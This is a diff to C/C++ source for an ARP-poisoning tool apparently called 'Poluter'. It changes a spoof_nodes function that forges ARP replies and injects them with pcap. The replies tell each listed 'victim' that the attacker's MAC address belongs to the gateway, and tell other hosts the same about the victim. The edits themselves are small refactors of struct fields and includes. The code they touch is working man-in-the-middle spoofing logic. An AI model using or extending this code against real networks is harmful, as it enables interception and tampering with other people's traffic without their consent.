@@ -2,10 +2,11 @@
 #include <assert.h>
 #include <string.h>
 
-#include "arputil.hpp"
-#include "nodes.hpp"
-#include "netinfo.hpp"
 #include "poluter.hpp"
+
+#include "arputil.hpp"
+#include "node.hpp"
+#include "netinfo.hpp"
 #include "debug.hpp"
 #include "util.hpp"
 
@@ -49,8 +50,8 @@ int Poluter::spoof_nodes(struct MsgSpoof msg) {
 	struct Node gateway;
 	bool hasGW = false;
 	struct NodeAddress current;
-	memcpy(current.hw, info.hw.ether_addr_octet, sizeof(ETH_ALEN));
-	current.in = info.ip4.local.s_addr;
+	memcpy(current.hw.ether_addr_octet, info.hw.ether_addr_octet, sizeof(ETH_ALEN));
+	current.in.s_addr = info.ip4.local.s_addr;
 
 	size_t node_count = 0;
 	struct Node *nodes = NULL;
@@ -59,12 +60,14 @@ int Poluter::spoof_nodes(struct MsgSpoof msg) {
 	for (size_t i = 0; i < targets_count; i++) {
 		struct NodeAddress victim = targets[i];
 		if (hasGW) {
-			arp_reply_create(buffer, victim.in, current.hw, gateway.addr.in, gateway.addr.hw);
+			arp_reply_create(buffer, victim.in.s_addr, current.hw.ether_addr_octet,
+				gateway.addr.in.s_addr, gateway.addr.hw.ether_addr_octet);
 			pcap_inject(handle, buffer, ARP_IP4_SIZE);
 		}
 		for (size_t i = 0; i < node_count; i++) {
-			if (nodes[i].is_online && nodes[i].addr.in != victim.in) {
-				arp_reply_create(buffer, nodes[i].addr.in, current.hw, victim.in, victim.hw);
+			if (nodes[i].addr.in.s_addr != victim.in.s_addr) {
+				arp_reply_create(buffer, nodes[i].addr.in.s_addr, current.hw.ether_addr_octet,
+					victim.in.s_addr, victim.hw.ether_addr_octet);
 				pcap_inject(handle, buffer, ARP_IP4_SIZE);
 			}
 		}
